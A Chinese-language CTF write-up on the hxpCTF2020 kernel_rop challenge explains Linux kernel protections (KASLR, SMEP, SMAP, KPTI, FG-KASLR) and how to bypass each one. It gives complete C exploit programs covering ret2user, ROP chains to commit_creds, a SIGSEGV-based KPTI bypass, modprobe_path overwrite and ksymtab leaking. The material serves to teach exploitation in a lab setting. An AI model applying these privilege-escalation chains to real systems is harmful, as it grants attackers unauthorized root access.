# linux kernel ROP 下的保护绕过

## 内核保护

（1）**KASLR**：表示内核地址空间布局随机化，它通过随机化内核的基址值，使一些内核攻击更难实现。需要泄露内核符号的基地址来绕过

（2）**SMEP**：（Supervisor Mode Execution Prevention），在现代intel处理器上，当设置了CR4存器的控制位时，会保护特权进程（比如在内核态的程序）不能在不含supervisor标志（对于ARM处理器，就是PXN标志）的内存区域执行代码。（直白地说就是内核程序不能跳转到用户态执行代码），这种保护使得以往的exploit使用的ret2user的方法直接失效。ret2user即在内核控制执行流，使之跳转到用户可控的用户空间执行代码的技术。因为SMEP，在用户空间的页表的虚拟地址并没有supervisor标志，当跳转到用户态时，会触发异常。

要检查SMEP是否被激活，我们可以简单地读取/proc/cpuinfo，检查是否有smep这个字段。

（3）**SMAP**：（ Supervisor Mode Access Prevention），同理，这个和SMEP差不多，只不过SMEP负责执行控制，这里负责读写控制。因此内核态不能读写用户态的内存数据。那你可能会疑惑了，如果这样限制的话，内核和用户态程序怎么交流？通过修改标志位，使某位置临时取消SMAP，来实现精确位置的读写。

（4）**KPTI**：（Kernel page-table isolation）即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。

（5）**FG-KASLR**：（Function Granular KASLR）内核在加载的时候会以函数级别重新排布内核代码，也就是说每个函数的地址都会乱掉。

## 例题分析

通过一道例题来学习开启各种保护后劫持控制流的方法，以 hxpCTF2020 kernel_rop 为例，read 可以随便读，write 可以随便写，就不贴图了

原始的 run.sh 如下，保护全开，这边通过修改保护来探究各个保护下的 ROP 方法

```shell
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd rootfs.cpio \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```

### level0 保护全关

启动脚本

把里面的保护全关掉

```shell
gcc exp.c -static -o ./fs/exp
# gcc exp.c -masm=intel -static -o ./fs/exp
cd fs
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..

qemu-system-x86_64 \
    -m 256M \
    -cpu kvm64 \
    -kernel vmlinuz \
    -initrd rootfs.cpio \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -s \
    -append "console=ttyS0 nokaslr nosmap nosmep nopti quiet panic=1"
    
```

> 这种保护全关的情况其实是比较好操作的，因为存在直接溢出的情况下可以 ret2user，也就是在内核空间执行用户空间的代码，利用了内核空间可以访问用户空间这个特性来定向内核代码或数据流指向用户空间，并以ring0的特权级在用户空间完成提权操作。

可以直接嵌入汇编代码完成对 commit_creds(prepare_kernel_cred(0)) 的调用并返回到用户态

##### exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

void get_shell();

size_t vmlinux_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t commit_creds = 0x4c6410;
size_t prepare_kernel_cred = 0x4c67f0;


void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);
    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    info("status saved!",0);
}

void show( size_t buf[] , int len){
    for (int i =0;i<len;i++){
        printf("0x%-4x -> 0x%lx\n" , i,buf[i]);
    }
}

void set_offset(){
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;

    info("commit_creds" , commit_creds);
    info("prepare_kernel_cred" , prepare_kernel_cred);
}

size_t user_rip = (size_t)shell;

void get_shell(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, commit_creds;" //commit_creds
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main(){
    
    size_t buf[0x100] = {0};
    size_t rop[0x600] = {0};
    size_t canary ; 
    int length =  0x140;
    int i = 0x10;

    save_status();
    
    int fd = open("/dev/hackme" , 2);

    read(fd , buf ,length);

    show(buf , length/8);
    canary = buf[i];
    set_offset();

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (size_t)get_shell;

    write(fd , rop , 0x80 + 0x100 );

}
```

### level1 开启 SMAP/SMEP

> 此时 ret2user 失效，内核态不再能执行用户态代码，那么就需要去找内核中的 gadget 来执行 rop，因为没有开启 kaslr，找到构造出链子即可

使用 ROPgadget 或者 objdump 来找到gadget ，去执行 commit_creds(prepare_kernel_cred(0)) 

这里将 rax 转化为 rdi 的 gadget 就花样百出了，不过也可以从其中找到有用的，比如下面的 gadget 。

```c
mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
```

这条 gadget 前面很符合要求 ，但是后面有一个跳转，我们可以在这之前执行一个 cmp 将 flag 标志位变成不符合跳转要求的情况，这样就能正常继续进入我们的控制流。

##### exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

void get_shell();

size_t vmlinux_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t commit_creds = 0x4c6410;
size_t prepare_kernel_cred = 0x4c67f0;
size_t pop_rdi_ret = 0x6370;
size_t pop_rdx_ret = 0x7616;
size_t pop_rcx_ret = 0x5f4bbc;
size_t pop_rbp_ret = 0x424;
size_t mov_rdi_rax_jne_pop2_ret = 0x66fea3;
size_t cmp_rdx_jne_pop2_ret = 0x964cc4;
size_t swapgs_pop_rbp_ret = 0xa55f;
size_t iretq_ret = 0xc0d9;


void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);
    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    info("status saved!",0);
}

void show( size_t buf[] , int len){
    for (int i =0;i<len;i++){
        printf("0x%-4x -> 0x%lx\n" , i,buf[i]);
    }
}

void set_offset(){
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;

    pop_rdi_ret += vmlinux_base;
    pop_rdx_ret += vmlinux_base;
    pop_rcx_ret += vmlinux_base;

    mov_rdi_rax_jne_pop2_ret += vmlinux_base;

    cmp_rdx_jne_pop2_ret += vmlinux_base;
    swapgs_pop_rbp_ret += vmlinux_base;
    iretq_ret += vmlinux_base;

    info("commit_creds" , commit_creds);
    info("prepare_kernel_cred" , prepare_kernel_cred);
}


int main(){
    
    size_t buf[0x100] = {0};
    size_t rop[0x600] = {0};
    size_t canary ; 
    int length =  0x140;
    int i = 0x10;

    save_status();

    int fd = open("/dev/hackme" , 2);

    read(fd , buf ,length);

    show(buf , length/8);
    canary = buf[i];
    // vmlinux_base = buf[0x26] - 0xa157;
    set_offset();

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    // rop[i++] = (size_t)get_shell;

    //commit_creads(prepare_kernel_cred(0));
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx_ret;
    rop[i++] = 8;
    rop[i++] = cmp_rdx_jne_pop2_ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = mov_rdi_rax_jne_pop2_ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = commit_creds;

    rop[i++] = swapgs_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    rop[i++] = (size_t )shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd , rop , 0x80 + 0x100 );

}
```

### level2 开启 SMAP/SMEP KPTI

> 这个时候因为开启了 KPTI ，在执行内核 ROP 返回到用户态时就会段错误。绕过方法可以使用 swapgs_restore_regs_and_return_to_usermode 中的 gadget 来修改寄存器，从而中规中矩的完成返回，另外，可以另辟蹊径使用 signal 函数来绕过 KPTI

具体原理如下

通过查找下面的信号量表可以发现有个 段错误 信号量 SIGSEGV，那返回到用户态时候不是报段错误吗，我们可以注册一个信号量处理函数来接受这个信号量，在程序报段错误的时候就会去执行它，并切换成用户上下文来调用从而getshell

![20201122011130843](kernel%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/20201122011130843.png)

比如下面这个例子就将段错误报错转化为了自定义的输出

```c
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>


void shell()
{
    printf("%s\n" , "???");
    //system("/bin/sh");
    exit(0);
}

int main(){
    
    signal(SIGSEGV, shell);
    printf("%s\n" , 114514);
    
}
```

那么同样的，在内核空间执行 commit_creads(prepare_kernel_cred(0)) 后，段错误转为 shell 函数来拿到 root权限，这里在getshell之后可以看到是新打开的终端获得了 root 权限，也就是 singel 处理函数跑在了 root

![image-20221012143646688](kernel%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/image-20221012143646688.png)

##### exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

void get_shell();

size_t vmlinux_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t commit_creds = 0x4c6410;
size_t prepare_kernel_cred = 0x4c67f0;
size_t pop_rdi_ret = 0x6370;
size_t pop_rdx_ret = 0x7616;
size_t pop_rcx_ret = 0x5f4bbc;
size_t pop_rbp_ret = 0x424;
size_t mov_rdi_rax_jne_pop2_ret = 0x66fea3;
size_t cmp_rdx_jne_pop2_ret = 0x964cc4;
size_t swapgs_pop_rbp_ret = 0xa55f;
size_t iretq_ret = 0xc0d9;


void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);
    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    info("status saved!",0);
}

void show( size_t buf[] , int len){
    for (int i =0;i<len;i++){
        printf("0x%-4x -> 0x%lx\n" , i,buf[i]);
    }
}

void set_offset(){
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;

    pop_rdi_ret += vmlinux_base;
    pop_rdx_ret += vmlinux_base;
    pop_rcx_ret += vmlinux_base;

    mov_rdi_rax_jne_pop2_ret += vmlinux_base;

    cmp_rdx_jne_pop2_ret += vmlinux_base;
    swapgs_pop_rbp_ret += vmlinux_base;
    iretq_ret += vmlinux_base;

    info("commit_creds" , commit_creds);
    info("prepare_kernel_cred" , prepare_kernel_cred);
}


int main(){
    
    size_t buf[0x100] = {0};
    size_t rop[0x600] = {0};
    size_t canary ; 
    int length =  (0x80 + 0x18 + 0x10);
    int i = 0x10;

    save_status();
    signal(SIGSEGV, shell);

    int fd = open("/dev/hackme" , 2);


    read(fd , buf ,length);

    show(buf , length/8);
    canary = buf[i];


    set_offset();

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    // rop[i++] = (size_t)get_shell;

    //commit_creads(prepare_kernel_cred(0));
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx_ret;
    rop[i++] = 8;
    rop[i++] = cmp_rdx_jne_pop2_ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = mov_rdi_rax_jne_pop2_ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = commit_creds;

    rop[i++] = swapgs_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    rop[i++] = (size_t )shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd , rop , 0x80 + 0x100 );

}
```

### level4  开启 SMAP/SMEP KPTI FG-KASLR

问为什么没有level3 ，本题开的是 FG-KASLR，level3便是开 KASLR 的版本，和上面 level2 相比多了个泄露地址和计算真实地址的过程

启动脚本

```shell
gcc exp.c -static -o ./fs/exp
# gcc exp.c -masm=intel -static -o ./fs/exp
cd fs
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..

qemu-system-x86_64 \
    -m 256M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd rootfs.cpio \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -s \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```

>  那么开启 FG-KASLR 之后粒度更细，但内核中始终有一些区域是不受影响的，我们就可以从这里面找gadget，但是开 FG-KASLR 后，从 rax 到 rdi 的 gadget 就没有了。。所以调用`commit_creads(prepare_kernel_cred(0))`会非常折磨，因此另一种方法就应运而生——覆写modprobe_path技术，这种方法使用的 gadget 比较少，限制也比较少，很多情况都可以通杀。

#### modprobe_path

当我们在系统上执行文件类型未知的文件时，系统将会执行当前路径存储在modprobe_path中的任何文件。因此，我们可以使用任意写入原语，将modprobe_path覆盖到我们自己编写的Shell脚本的路径中，然后执行具有未知文件签名的虚拟文件。其结果将导致在系统仍处于内核模式时执行Shell脚本，从而导致root权限的任意代码执行。

简而言之，就是覆盖 modprobe_path 里的路径，之后在这个路径文件写上自己的命令，从而在内核执行该命令来getshell，而执行 modprobe_path 的条件就是执行系统未知的文件，是现在比较主流的方法。

> 另外这里摸个题外话，有些 gadget 通过 ROPgadget 找不到是因为我们 x86 的指令是不定长的，有些网上的 exp 找到的 gadget 可能是通过指令错位找到的 gadget ，因此，还是比较建议通过 `objdump` 来找

##### exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

void get_shell();

size_t vmlinux_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t swapgs_restore_regs_and_return_to_usermode = 0x200f10;
size_t kpti_trampoline = 0;
size_t modprobe_path = 0x1061820;

size_t write_rbx_rax_pop_rbx_rbp_ret = 0x306d;

// ffffffff8100306d:	48 89 03             	mov    QWORD PTR [rbx],rax
// ffffffff81003070:	5b                   	pop    rbx
// ffffffff81003071:	5d                   	pop    rbp
// ffffffff81003072:	c3                   	ret

size_t pop_rbx_r12_r13_rbp_ret = 0x3039;
size_t pop_rax_ret = 0x4d11;


void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);
    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    info("status saved!",0);
}

void show( size_t buf[] , int len){
    for (int i =0;i<len;i++){
        printf("0x%-4x -> 0x%lx\n" , i,buf[i]);
    }
}

void set_offset(){

    swapgs_restore_regs_and_return_to_usermode += vmlinux_base;
    kpti_trampoline = swapgs_restore_regs_and_return_to_usermode + 22;
    pop_rbx_r12_r13_rbp_ret += vmlinux_base;
    modprobe_path += vmlinux_base;
    write_rbx_rax_pop_rbx_rbp_ret += vmlinux_base;
    pop_rax_ret += vmlinux_base;

    info("vmlinux_base" , vmlinux_base);
    info("modprobe_path" , modprobe_path);
    info("pop_rax_ret" , pop_rax_ret);
    info("write_rbx_rax_pop_rbx_rbp_ret" , write_rbx_rax_pop_rbx_rbp_ret);
    info("kpti_trampoline" , kpti_trampoline);

}

void get_flag(){
    info("Write command" ,0);

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    info("Run unknown file" , 0);

    system("/tmp/dummy");
    system("cat /tmp/flag");

    exit(0);
}

int main(){
    
    size_t buf[0x100] = {0};
    size_t rop[0x600] = {0};
    size_t canary ; 
    int length =  (0x80 + 0x18 + 0x100);
    int i = 0x10;

    save_status();

    int fd = open("/dev/hackme" , 2);

    read(fd , buf ,length);

    show(buf , length/8);
    canary = buf[i];
    vmlinux_base = buf[0x26] & 0xFFFFFFFFFFFF0000;

    set_offset();

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;

    // Write data to modprobe_path
    rop[i++] = pop_rax_ret;
    rop[i++] = 0x782f706d742f; // tmp/x
    rop[i++] = pop_rbx_r12_r13_rbp_ret;
    rop[i++] = modprobe_path;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = write_rbx_rax_pop_rbx_rbp_ret;
    rop[i++] = 0;
    rop[i++] = 0;

    rop[i++] = kpti_trampoline;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (size_t )get_flag;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd , rop , 0x80 + 0x100 );

}
```

#### 常规ROP

使用纯ROP方法最困难的地方就是找 gadget 了， 因为 FG-KASLR 打乱了几乎每个函数的地址，因此可以用到的gadget很少，但是 ksymtab 表不会变，我们可以泄露出 ksymtab 的内容来推出 commit_creds prepare_kernel_cred 的真实地址和 ，这样困难就变成了将 rax 转移到 rdi，所以只能将调用过程分解，分成两次来 ROP

另外在找 gadget 的时候，这里的 5f 可以错出一个 pop rdi 出来，真滴神奇

```c
ffffffff8100389f:	41 5f                	pop    r15
ffffffff810038a1:	5d                   	pop    rbp
ffffffff810038a2:	c3                   	ret
```

所以 0x38a0 的 gadget 就是 pop rdi ;pop rbp; ret ，也可以直接用 0x4854，但没上一个这么干净

```c
ffffffff81004854:	5f                   	pop    rdi
ffffffff81004855:	5e                   	pop    rsi
ffffffff81004856:	5a                   	pop    rdx
ffffffff81004857:	59                   	pop    rcx
ffffffff81004858:	5d                   	pop    rbp
ffffffff81004859:	c3                   	ret    
```

ksymtab 是这么个样子

```c
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
```

可以拿到第一个 偏移，之后加上 __ksymtab_commit_creds 就可以得到真实地址了，因此通过gadget 将数据写入rax之后在返回到用户态，就可以得到其真实地址了，对此，也有个神奇的gadget

```c
ffffffff81004aad:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
ffffffff81004ab1:	5d                   	pop    rbp
ffffffff81004ab2:	c3                   	ret    
```

但是 ，直接在函数中调用 write 貌似会清掉 rax ，因此可以写一个分发器，每次返回到这个 分发器函数 ，另外 kpti_trampoline 还可以控制 rdi ，那就可以直接 case 了

之后的 commit_creds(prepare_kernel_cred(0)) 也同样分为两次，首先第一次执行 prepare_kernel_cred(0) 得到结构体并保存，在第二次 ROP的时候在用上即可

![image-20221012175419841](kernel%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/image-20221012175419841.png)

##### exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <signal.h>

void get_shell();

size_t vmlinux_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t commit_creds = 0;
size_t prepare_kernel_cred = 0;
size_t __ksymtab_commit_creds = 0xf87d90;
size_t __ksymtab_prepare_kernel_cred = 0xf8d4fc;

size_t swapgs_restore_regs_and_return_to_usermode = 0x200f10;
size_t kpti_trampoline = 0;

size_t write_rax_rax_pop_rbp_ret = 0x4aad;
size_t pop_rdi_rbp_ret = 0x38a0;
size_t pop_rax_ret = 0x4d11;


int fd = 0;
size_t canary = 0;
size_t leak = 0;

void control();

void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);
    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    info("status saved!",0);
}

void show( size_t buf[] , int len){
    for (int i =0;i<len;i++){
        printf("0x%-4x -> 0x%lx\n" , i,buf[i]);
    }
}

void set_offset(){

    __ksymtab_commit_creds += vmlinux_base;
    __ksymtab_prepare_kernel_cred += vmlinux_base;

    swapgs_restore_regs_and_return_to_usermode += vmlinux_base;
    kpti_trampoline = swapgs_restore_regs_and_return_to_usermode + 22;

    write_rax_rax_pop_rbp_ret += vmlinux_base;
    pop_rdi_rbp_ret += vmlinux_base;
    pop_rax_ret += vmlinux_base;

    info("__ksymtab_commit_creds" , __ksymtab_commit_creds);
    info("__ksymtab_prepare_kernel_cred" , __ksymtab_prepare_kernel_cred);
}

void get_addr(size_t to_leak , int next){

    size_t rop[0x600] = {0};
    int i = 0x10;

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;

    rop[i++] = pop_rax_ret;
    rop[i++] = to_leak - 0x10;
    rop[i++] = write_rax_rax_pop_rbp_ret ;
    rop[i++] = user_sp;

    rop[i++] = kpti_trampoline;
    rop[i++] = next; // rdi
    rop[i++] = 0;
    rop[i++] = (size_t )control;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd , rop , 0x80 + 0x100 );
    error("Return ERROR");
}

void to_rop( size_t address ,int next ){

    size_t rop[0x600] = {0};
    int i = 0x10;

    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;

    if (address){
        rop[i++] = pop_rdi_rbp_ret;
        rop[i++] = address;
        rop[i++] = user_sp;
        rop[i++] = commit_creds;
    }else{
        rop[i++] = pop_rdi_rbp_ret;
        rop[i++] = 0;
        rop[i++] = user_sp;
        rop[i++] = prepare_kernel_cred;
    }

    rop[i++] = kpti_trampoline;
    rop[i++] = next; // rdi
    rop[i++] = 0;
    rop[i++] = (size_t )control;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd , rop , 0x80 + 0x100 );
    error("Return ERROR");
}


void control(int flag){
    int offset;
    __asm__(
        ".intel_syntax noprefix;"
        "mov leak, rax;"
        ".att_syntax;"
    );

    switch (flag)
    {
        case 1:
            get_addr(__ksymtab_prepare_kernel_cred , 2 );
            break;
        case 2:
            offset = leak & 0xffffffff;
            prepare_kernel_cred = __ksymtab_prepare_kernel_cred + offset;
            get_addr(__ksymtab_commit_creds , 3);
            break;
        case 3:
            offset = leak & 0xffffffff;
            commit_creds = __ksymtab_commit_creds + offset;
            info("prepare_kernel_cred" , prepare_kernel_cred);
            info("commit_creds" , commit_creds);
            to_rop( 0 , 4 );
            break;
        case 4:
            info("struct",leak);
            to_rop(leak , 5 );
            break;
        case 5:
            shell();
            break;
        default:
            break;
    }
}

int main(){
    
    size_t buf[0x100] = {0};
    size_t rop[0x600] = {0}; 
    int length =  (0x80 + 0x18 + 0x100);
    int i = 0x10;

    save_status();
    signal(SIGSEGV, shell);

    fd = open("/dev/hackme" , 2);

    read(fd , buf ,length);

    // show(buf , length/8);
    canary = buf[i];
    vmlinux_base = buf[0x26] & 0xFFFFFFFFFFFF0000;
    set_offset();

    control(1);

}
```

另外，笔者认为可能还存在一种方法，在 level2 中可以看到这些gadget，如果我们通过上面泄露 commit_creds 的方法多泄露以下两个 gadget 所在的函数，应该也可以一次性 ROP 掉

```c
size_t mov_rdi_rax_jne_pop2_ret = 0x66fea3;
size_t cmp_rdx_jne_pop2_ret = 0x964cc4;
```

## Reference

[CVE-2017-1000112-UFO 学习总结 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1396155)

[Linux内核漏洞利用技术：覆写modprobe_path-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/232545)

[Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)](https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/)

[Learning Linux Kernel Exploitation - Part 1 - Midas Blog (lkmidas.github.io)](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/)

[Learning Linux Kernel Exploitation - Part 3 - Midas Blog (lkmidas.github.io)](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/)